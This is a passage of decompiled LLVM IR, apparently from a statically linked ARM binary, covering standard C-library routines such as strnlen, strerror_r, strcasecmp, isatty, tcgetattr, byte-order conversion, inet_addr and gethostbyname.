dec_label_pc_12828:                               ; preds = %dec_label_pc_12818
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_12820, { 1, 0 }
  uselistorder i32 %v0_1281c, { 1, 0 }
  uselistorder i32 %v6_12808, { 0, 2, 1 }
  uselistorder i32 %v1_127f8, { 2, 1, 0 }
  uselistorder i32 %v2_127e8, { 2, 1, 0 }
  uselistorder i32 %v1_127d8, { 1, 0 }
  uselistorder i32 %v0_127d4, { 1, 0 }
  uselistorder i32 %v6_127c8, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 4, 5, 1, 0, 3 }
  uselistorder label %dec_label_pc_12818, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1282c = load i32, i32* @r1, align 4
  %v2_1282c = icmp eq i32 %v0_1282c, 0
  br i1 %v2_1282c, label %bb, label %dec_label_pc_1285c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_12844:                               ; preds = %dec_label_pc_1286c
  %v3_12844 = icmp uge i32 %v5_128f8, %v1_12844
  %v9_12844 = icmp eq i32 %v5_128f8, %v1_12844
  %v2_12848 = xor i1 %v3_12844, true
  %v3_12848 = or i1 %v9_12844, %v2_12848
  br i1 %v3_12848, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_12844
  %v6_12848 = sub i32 %v5_128f8, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_12844, %bb19
  %v5_1284c = phi i32 [ %v1_12844, %dec_label_pc_12844 ], [ %v6_12848, %bb19 ]
  %v2_1284c = xor i1 %v9_12844, true
  %v3_1284c = and i1 %v3_12844, %v2_1284c
  br i1 %v3_1284c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_1284c = sub i32 %v5_1284c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_12850 = phi i32 [ %v5_1284c, %bb20 ], [ %v6_1284c, %bb21 ]
  ret i32 %v8_12850

dec_label_pc_12854:                               ; preds = %dec_label_pc_128a0
  br label %dec_label_pc_128f4

dec_label_pc_1285c:                               ; preds = %entry
  %v2_1285c = add i32 %tmp, %v0_1282c
  %v3_1285c = icmp ult i32 %v2_1285c, %tmp
  br i1 %v3_1285c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1285c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1285c, %bb23
  %v5_128f8 = phi i32 [ %v2_1285c, %dec_label_pc_1285c ], [ -1, %bb23 ]
  %v1_1287c2 = urem i32 %tmp, 4
  %v2_1287c3 = icmp eq i32 %v1_1287c2, 0
  br i1 %v2_1287c3, label %dec_label_pc_12884, label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %bb24, %dec_label_pc_12878
  %v1_12844 = phi i32 [ %v1_12878, %dec_label_pc_12878 ], [ %tmp, %bb24 ]
  %v1_1286c = inttoptr i32 %v1_12844 to i8*
  %v2_1286c = load i8, i8* %v1_1286c, align 1
  %v2_12870 = icmp eq i8 %v2_1286c, 0
  br i1 %v2_12870, label %dec_label_pc_12844, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_1286c
  %v1_12878 = add i32 %v1_12844, 1
  %v1_1287c = urem i32 %v1_12878, 4
  %v2_1287c = icmp eq i32 %v1_1287c, 0
  br i1 %v2_1287c, label %dec_label_pc_12884, label %dec_label_pc_1286c

dec_label_pc_12884:                               ; preds = %dec_label_pc_12878, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_12878, %dec_label_pc_12878 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_128e432 = icmp ult i32 %storemerge.lcssa, %v5_128f8
  br i1 %v3_128e432, label %dec_label_pc_1288c, label %dec_label_pc_128f4

dec_label_pc_1288c:                               ; preds = %dec_label_pc_128e0, %dec_label_pc_12884
  %v0_1285439 = phi i32 [ %v4_1288c, %dec_label_pc_128e0 ], [ %storemerge.lcssa, %dec_label_pc_12884 ]
  %v1_1288c = inttoptr i32 %v0_1285439 to i32*
  %v2_1288c = load i32, i32* %v1_1288c, align 4
  %v4_1288c = add i32 %v0_1285439, 4
  store i32 %v4_1288c, i32* @lr, align 4
  %v2_12890 = add i32 %v2_1288c, -16843009
  %v2_12894 = and i32 %v2_12890, -2139062144
  %v2_12898 = icmp eq i32 %v2_12894, 0
  br i1 %v2_12898, label %dec_label_pc_128e0, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %dec_label_pc_1288c
  %v2_128a0 = inttoptr i32 %v0_1285439 to i8*
  %v3_128a0 = load i8, i8* %v2_128a0, align 1
  %v2_128a8 = icmp eq i8 %v3_128a0, 0
  %v1_128ac = add i32 %v0_1285439, 1
  br i1 %v2_128a8, label %dec_label_pc_12854, label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128a0
  %v2_128b4 = inttoptr i32 %v1_128ac to i8*
  %v3_128b4 = load i8, i8* %v2_128b4, align 1
  %v2_128b8 = icmp eq i8 %v3_128b4, 0
  br i1 %v2_128b8, label %dec_label_pc_128f4, label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128b4
  %v1_128c0 = add i32 %v0_1285439, 2
  %v2_128c0 = inttoptr i32 %v1_128c0 to i8*
  %v3_128c0 = load i8, i8* %v2_128c0, align 1
  %v2_128c4 = icmp eq i8 %v3_128c0, 0
  br i1 %v2_128c4, label %dec_label_pc_128f4, label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128c0
  %v1_128d0 = add i32 %v0_1285439, 3
  %v2_128d0 = inttoptr i32 %v1_128d0 to i8*
  %v3_128d0 = load i8, i8* %v2_128d0, align 1
  %v2_128d4 = icmp eq i8 %v3_128d0, 0
  br i1 %v2_128d4, label %dec_label_pc_128f4, label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128d0, %dec_label_pc_1288c
  %v3_128e4 = icmp ult i32 %v4_1288c, %v5_128f8
  br i1 %v3_128e4, label %dec_label_pc_1288c, label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e0, %dec_label_pc_12884, %dec_label_pc_128b4, %dec_label_pc_128c0, %dec_label_pc_128d0, %dec_label_pc_12854
  %v1_128f4 = phi i32 [ %v0_1285439, %dec_label_pc_12854 ], [ %storemerge.lcssa, %dec_label_pc_12884 ], [ %v1_128ac, %dec_label_pc_128b4 ], [ %v1_128c0, %dec_label_pc_128c0 ], [ %v1_128d0, %dec_label_pc_128d0 ], [ %v5_128f8, %dec_label_pc_128e0 ]
  %v3_128f4 = icmp uge i32 %v5_128f8, %v1_128f4
  %v9_128f4 = icmp eq i32 %v5_128f8, %v1_128f4
  %v2_128f8 = xor i1 %v3_128f4, true
  %v3_128f8 = or i1 %v9_128f4, %v2_128f8
  br i1 %v3_128f8, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_128f4
  %v6_128f8 = sub i32 %v5_128f8, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_128f4, %bb25
  %v5_128fc = phi i32 [ %v1_128f4, %dec_label_pc_128f4 ], [ %v6_128f8, %bb25 ]
  %v2_128fc = xor i1 %v9_128f4, true
  %v3_128fc = and i1 %v3_128f4, %v2_128fc
  br i1 %v3_128fc, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_128fc = sub i32 %v5_128fc, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_12900 = phi i32 [ %v5_128fc, %bb26 ], [ %v6_128fc, %bb27 ]
  ret i32 %v8_12900

; uselistorder directives
  uselistorder i1 %v3_128f4, { 1, 0 }
  uselistorder i32 %v4_1288c, { 1, 2, 0 }
  uselistorder i32 %v0_1285439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_12878, { 1, 0, 2 }
  uselistorder i32 %v1_12844, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_128f8, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_12844, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_128f4, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_1286c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v3_1290c = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12914 = call i32 @__xpg_strerror_r()
  %v0_12918 = load i32, i32* @r4, align 4
  store i32 %v3_1290c, i32* @r4, align 4
  ret i32 %v0_12918
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_12920 = load i32, i32* @r4, align 4
  %v6_12920 = load i32, i32* @r5, align 4
  %v9_12920 = load i32, i32* @r6, align 4
  %v15_12920 = load i32, i32* @r8, align 4
  %v0_12924 = load i32, i32* @r0, align 4
  %v0_12930 = load i32, i32* @r1, align 4
  store i32 %v0_12930, i32* @r8, align 4
  %v0_12934 = load i32, i32* @r2, align 4
  store i32 %v0_12934, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_12924, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_1296c

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1cad0.660 to i32), i32* @r5, align 4
  %v2_129543446 = icmp eq i32 %v0_12924, 0
  br i1 %v2_129543446, label %bb26, label %dec_label_pc_12948.lr.ph

dec_label_pc_12948:                               ; preds = %dec_label_pc_12948.lr.ph, %bb
  %v2_1296041 = phi i1 [ %v2_129603849, %dec_label_pc_12948.lr.ph ], [ %v2_12960, %bb ]
  %v1_1296440 = phi i32 [ %v0_12954.pr48, %dec_label_pc_12948.lr.ph ], [ %v2_12950, %bb ]
  %v0_1294c39 = phi i32 [ %v0_12958547, %dec_label_pc_12948.lr.ph ], [ %v1_1294c, %bb ]
  %v1_1294c = add i32 %v0_1294c39, 1
  store i32 %v1_1294c, i32* @r5, align 4
  br i1 %v2_1296041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_12948
  %v2_12950 = add i32 %v1_1296440, -1
  %v2_12954 = icmp eq i32 %v2_12950, 0
  %v1_12958 = inttoptr i32 %v1_1294c to i8*
  %v2_12958 = load i8, i8* %v1_12958, align 1
  %v2_12960 = icmp eq i8 %v2_12958, 0
  br i1 %v2_12954, label %dec_label_pc_12960, label %dec_label_pc_12948

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_12948
  %v1_1295835 = inttoptr i32 %v1_1294c to i8*
  %v2_1295836 = load i8, i8* %v1_1295835, align 1
  %v2_1296038 = icmp eq i8 %v2_1295836, 0
  br label %dec_label_pc_12948.lr.ph

dec_label_pc_12948.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_129603849 = phi i1 [ %v2_1296038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_12954.pr48 = phi i32 [ %v1_1296440, %thread-pre-split.loopexit ], [ %v0_12924, %thread-pre-split.preheader ]
  %v0_12958547 = phi i32 [ %v1_1294c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1cad0.660 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_12948

dec_label_pc_12960:                               ; preds = %bb
  br i1 %v2_12960, label %dec_label_pc_1296c, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_12960
  %v0_1294c.lcssa55 = phi i32 [ %v1_1294c, %dec_label_pc_12960 ], [ ptrtoint ([8 x i8]* @global_var_1cad0.660 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129a0

dec_label_pc_1296c:                               ; preds = %dec_label_pc_12960, %entry
  %v3_12970 = ashr i32 %v0_12924, 31
  %v5_12984 = bitcast i32* %stack_var_-25 to i8*
  %v6_12984 = call i32 @_uintmaxtostr(i8* %v5_12984, i32 %v0_12924, i32 %v3_12970, i32 -10, i32 0)
  %v1_12988 = add i32 %v6_12984, -14
  store i32 %v1_12988, i32* @r5, align 4
  store i32 %v1_12988, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1cac0.662 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_12998 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_129a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %bb26, %dec_label_pc_1296c
  %v0_129a0 = phi i32 [ %v0_1294c.lcssa55, %bb26 ], [ %v0_129a0.pre, %dec_label_pc_1296c ]
  %v1_129a0 = inttoptr i32 %v0_129a0 to i8*
  %v3_129a4 = call i32 @strlen(i8* %v1_129a0)
  %v0_129a8 = load i32, i32* @r8, align 4
  %v2_129a8 = icmp eq i32 %v0_129a8, 0
  %v1_129ac = add i32 %v3_129a4, 1
  store i32 %v1_129ac, i32* @r4, align 4
  br i1 %v2_129a8, label %bb27, label %dec_label_pc_129a0._crit_edge

dec_label_pc_129a0._crit_edge:                    ; preds = %dec_label_pc_129a0
  %v1_129b4.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_129a0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_129a0._crit_edge, %bb27
  %v4_129b8 = phi i32 [ %v1_129b4.pre, %dec_label_pc_129a0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_129ac, %v4_129b8
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_129b8, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_129c814 = phi i32 [ %v4_129b8, %bb29 ], [ %v1_129ac, %bb28 ]
  %v2_129c0 = icmp eq i32 %v0_129c814, 0
  br i1 %v2_129c0, label %dec_label_pc_129e4, label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %.thread16
  store i32 %v0_129c814, i32* @r2, align 4
  %v0_129cc = load i32, i32* @r5, align 4
  store i32 %v0_129cc, i32* @r1, align 4
  store i32 %v0_129a8, i32* @r0, align 4
  %v0_129d4 = call i32 @memcpy()
  %v0_129d8 = load i32, i32* @r8, align 4
  %v1_129d8 = load i32, i32* @r4, align 4
  %v2_129d8 = add i32 %v1_129d8, %v0_129d8
  %v3_129e0 = add i32 %v2_129d8, -1
  %v4_129e0 = inttoptr i32 %v3_129e0 to i8*
  store i8 0, i8* %v4_129e0, align 1
  br label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %.thread16, %dec_label_pc_129c8
  %v0_129e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_129e4 = icmp eq i32 %v0_129e4, 0
  br i1 %v2_129e4, label %dec_label_pc_129f4, label %dec_label_pc_129ec

dec_label_pc_129ec:                               ; preds = %dec_label_pc_129e4
  %v0_129ec = call i32 @__errno_location()
  %v0_129f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_129f0 = inttoptr i32 %v0_129ec to i32*
  store i32 %v0_129f0, i32* %v2_129f0, align 4
  %v0_129f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129f4

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129e4, %dec_label_pc_129ec
  %v0_129f4 = phi i32 [ 0, %dec_label_pc_129e4 ], [ %v0_129f4.pre, %dec_label_pc_129ec ]
  store i32 %v3_12920, i32* @r4, align 4
  store i32 %v6_12920, i32* @r5, align 4
  store i32 %v9_12920, i32* @r6, align 4
  store i32 %v15_12920, i32* @r8, align 4
  ret i32 %v0_129f4

; uselistorder directives
  uselistorder i32 %v4_129b8, { 1, 2, 0 }
  uselistorder i32 %v1_129ac, { 1, 0, 2 }
  uselistorder i32 %v1_1294c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_12924, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder label %dec_label_pc_129f4, { 1, 0 }
  uselistorder label %dec_label_pc_129e4, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_129a0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_12a18

dec_label_pc_12a18:                               ; preds = %bb8, %entry
  %v8_12a7c3 = phi i32 [ %v8_12a7c, %bb8 ], [ 0, %entry ]
  %v0_12a70 = phi i32 [ %v1_12a70, %bb8 ], [ %arg2, %entry ]
  %v0_12a74 = phi i32 [ %v1_12a74, %bb8 ], [ %tmp, %entry ]
  %v9_12a18 = icmp eq i32 %v0_12a74, %v0_12a70
  br i1 %v9_12a18, label %dec_label_pc_12a18._crit_edge, label %dec_label_pc_12a20

dec_label_pc_12a18._crit_edge:                    ; preds = %dec_label_pc_12a18
  %.pre = inttoptr i32 %v0_12a70 to i8*
  br label %bb8

dec_label_pc_12a20:                               ; preds = %dec_label_pc_12a18
  %v1_12a24 = inttoptr i32 %v0_12a74 to i8*
  %v2_12a24 = load i8, i8* %v1_12a24, align 1
  %v3_12a24 = zext i8 %v2_12a24 to i32
  %v1_12a28 = inttoptr i32 %v0_12a70 to i8*
  %v2_12a28 = load i8, i8* %v1_12a28, align 1
  %v3_12a28 = zext i8 %v2_12a28 to i32
  %v2_12a2c = load i32, i32* bitcast (i32** @global_var_2abc0.664 to i32*), align 4
  %v2_12a30 = mul nuw nsw i32 %v3_12a24, 2
  store i32 %v2_12a30, i32* @ip, align 4
  %v2_12a34 = mul nuw nsw i32 %v3_12a28, 2
  %v2_12a38 = add i32 %v2_12a34, %v2_12a2c
  %v2_12a3c = add i32 %v2_12a2c, %v2_12a30
  %v1_12a40 = add i32 %v2_12a3c, 1
  %v2_12a40 = inttoptr i32 %v1_12a40 to i8*
  %v3_12a40 = load i8, i8* %v2_12a40, align 1
  %v4_12a40 = zext i8 %v3_12a40 to i32
  %v1_12a44 = add i32 %v2_12a38, 1
  %v2_12a44 = inttoptr i32 %v1_12a44 to i8*
  %v3_12a44 = load i8, i8* %v2_12a44, align 1
  %v4_12a44 = zext i8 %v3_12a44 to i32
  %v3_12a48 = inttoptr i32 %v2_12a38 to i8*
  %v4_12a48 = load i8, i8* %v3_12a48, align 1
  %v6_12a48 = zext i8 %v4_12a48 to i32
  %v3_12a4c = inttoptr i32 %v2_12a3c to i8*
  %v4_12a4c = load i8, i8* %v3_12a4c, align 1
  %v6_12a4c = zext i8 %v4_12a4c to i32
  %v3_12a50 = mul nuw i32 %v4_12a44, 16777216
  %v3_12a54 = mul nuw i32 %v4_12a40, 16777216
  %v4_12a58 = sdiv i32 %v3_12a54, 65536
  %v5_12a58 = or i32 %v6_12a4c, %v4_12a58
  %v4_12a5c = sdiv i32 %v3_12a50, 65536
  %v5_12a5c = or i32 %v4_12a5c, %v6_12a48
  %v2_12a60 = sub nsw i32 %v5_12a58, %v5_12a5c
  %v9_12a60 = icmp eq i32 %v5_12a58, %v5_12a5c
  br i1 %v9_12a60, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_12a20
  ret i32 %v2_12a60

bb8:                                              ; preds = %dec_label_pc_12a18._crit_edge, %dec_label_pc_12a20
  %v1_12a68.pre-phi = phi i8* [ %.pre, %dec_label_pc_12a18._crit_edge ], [ %v1_12a24, %dec_label_pc_12a20 ]
  %v8_12a7c = phi i32 [ %v8_12a7c3, %dec_label_pc_12a18._crit_edge ], [ %v2_12a60, %dec_label_pc_12a20 ]
  %v2_12a68 = load i8, i8* %v1_12a68.pre-phi, align 1
  %v2_12a6c = icmp eq i8 %v2_12a68, 0
  %v1_12a70 = add i32 %v0_12a70, 1
  %v1_12a74 = add i32 %v0_12a74, 1
  store i32 %v1_12a74, i32* @lr, align 4
  br i1 %v2_12a6c, label %dec_label_pc_12a7c, label %dec_label_pc_12a18

dec_label_pc_12a7c:                               ; preds = %bb8
  ret i32 %v8_12a7c

; uselistorder directives
  uselistorder i32 %v1_12a74, { 1, 0 }
  uselistorder i32 %v2_12a60, { 1, 0 }
  uselistorder i32 %v5_12a5c, { 1, 0 }
  uselistorder i32 %v5_12a58, { 1, 0 }
  uselistorder i32 %v2_12a30, { 1, 0 }
  uselistorder i32 %v0_12a70, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2f1d8.666 to i32), i32* @r2, align 4
  %v0_12a88 = call i32 @strtok_r()
  ret i32 %v0_12a88
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_12a94 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_12a94, i32* @r1, align 4
  %v0_12a9c = call i32 @__GI_tcgetattr()
  %v1_12aa0 = sub i32 1, %v0_12a9c
  %v2_12aa0 = icmp ult i32 %v0_12a9c, 2
  br i1 %v2_12aa0, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_12aac = phi i32 [ %v1_12aa0, %entry ], [ 0, %bb ]
  ret i32 %v5_12aac

; uselistorder directives
  uselistorder i32 %v0_12a9c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v0_12ab8 = load i32, i32* @r0, align 4
  %v4_12ab8 = call i32 @ioctl(i32 %v0_12ab8, i32 21513, i32 1)
  %v0_12abc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12abc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v4_12ab8

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12ac0 = load i32, i32* @r4, align 4
  %v6_12ac0 = load i32, i32* @r5, align 4
  %v2_12ac4 = ptrtoint i32* %stack_var_-56 to i32
  %v0_12ac8 = load i32, i32* @r1, align 4
  store i32 %v0_12ac8, i32* %r6.global-to-local, align 4
  %v0_12ad4 = load i32, i32* @r0, align 4
  %v3_12ad4 = call i32 @ioctl(i32 %v0_12ad4, i32 21505, i32 %v2_12ac4)
  store i32 %v3_12ad4, i32* %r7.global-to-local, align 4
  %v2_12ad8 = icmp eq i32 %v3_12ad4, 0
  %v2_12ae0 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_12ae0, i32* @r1, align 4
  %v0_12ae8 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_12ad8, label %dec_label_pc_12af0, label %dec_label_pc_12b1c

dec_label_pc_12af0:                               ; preds = %entry
  %v1_12ae8 = add i32 %v0_12ae8, 17
  %v4_12af8 = zext i8 %tmp to i32
  store i32 %v4_12af8, i32* @r5, align 4
  %v2_12afc = load i32, i32* %stack_var_-56, align 4
  %v1_12b00 = inttoptr i32 %v0_12ae8 to i32*
  store i32 %v2_12afc, i32* %v1_12b00, align 4
  %v3_12b00 = add i32 %v0_12ae8, 4
  %v4_12b00 = inttoptr i32 %v3_12b00 to i32*
  %v5_12b00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12b00, i32* %v4_12b00, align 4
  %v6_12b00 = add i32 %v0_12ae8, 8
  %v7_12b00 = inttoptr i32 %v6_12b00 to i32*
  %v8_12b00 = load i32, i32* @lr, align 4
  store i32 %v8_12b00, i32* %v7_12b00, align 4
  %v0_12b04 = load i32, i32* @r4, align 4
  %v1_12b04 = load i32, i32* %r6.global-to-local, align 4
  %v2_12b04 = add i32 %v1_12b04, 12
  %v3_12b04 = inttoptr i32 %v2_12b04 to i32*
  store i32 %v0_12b04, i32* %v3_12b04, align 4
  %v0_12b08 = load i32, i32* @r5, align 4
  %v1_12b08 = trunc i32 %v0_12b08 to i8
  %v2_12b08 = load i32, i32* %r6.global-to-local, align 4
  %v3_12b08 = add i32 %v2_12b08, 16
  %v4_12b08 = inttoptr i32 %v3_12b08 to i8*
  store i8 %v1_12b08, i8* %v4_12b08, align 1
  %v4_12b0c = call i32 @__GI_mempcpy(i32 %v1_12ae8, i32 %v2_12ae0, i32 19, i32 %v2_12afc)
  store i32 %v4_12b0c, i32* @r0, align 4
  %v0_12b10 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12b10, i32* @r1, align 4
  store i32 13, i32* @r2, align 4
  %v0_12b18 = call i32 @__GI_memset()
  br label %dec_label_pc_12b1c

dec_label_pc_12b1c:                               ; preds = %entry, %dec_label_pc_12af0
  %v0_12b1c = phi i32 [ %v3_12ad4, %entry ], [ %v0_12b10, %dec_label_pc_12af0 ]
  store i32 %v3_12ac0, i32* @r4, align 4
  store i32 %v6_12ac0, i32* @r5, align 4
  ret i32 %v0_12b1c

; uselistorder directives
  uselistorder i32 %v0_12ae8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12b1c, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12b48 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_12b48
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_12b58 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_12b5c = urem i32 %tmp1, 256
  %v5_12b5c = or i32 %v4_12b5c, %v1_12b58
  ret i32 %v5_12b5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12b80 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_12b80
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_12b90 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_12b94 = urem i32 %tmp1, 256
  %v5_12b94 = or i32 %v4_12b94, %v1_12b90
  ret i32 %v5_12b94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_12ba0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_12ba8 = load i32, i32* @r0, align 4
  %v2_12ba8 = inttoptr i32 %v0_12ba8 to i8*
  %v3_12ba8 = call i32 @inet_aton(i8* %v2_12ba8, i32 %v2_12ba0)
  %v2_12bac = icmp eq i32 %v3_12ba8, 0
  br i1 %v2_12bac, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_12bb4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_12bbc = phi i32 [ -1, %entry ], [ %v3_12bb4, %bb ]
  ret i32 %v5_12bbc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12bc0 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12bcc = call i32 @__GI___h_errno_location()
  %v2_12bd0 = ptrtoint i32* %stack_var_-12 to i32
  %v0_12bdc = load i32, i32* @r4, align 4
  %v7_12bec = call i32 @gethostbyname_r(i32 %v0_12bdc, i32* nonnull @global_var_2f3a8.670, i32 ptrtoint (i32* @global_var_2f1dc.672 to i32), i32 460, i32 %v2_12bd0, i32 %v0_12bcc)
  %v3_12bf0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_12bc0, i32* @r4, align 4
  ret i32 %v3_12bf0
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
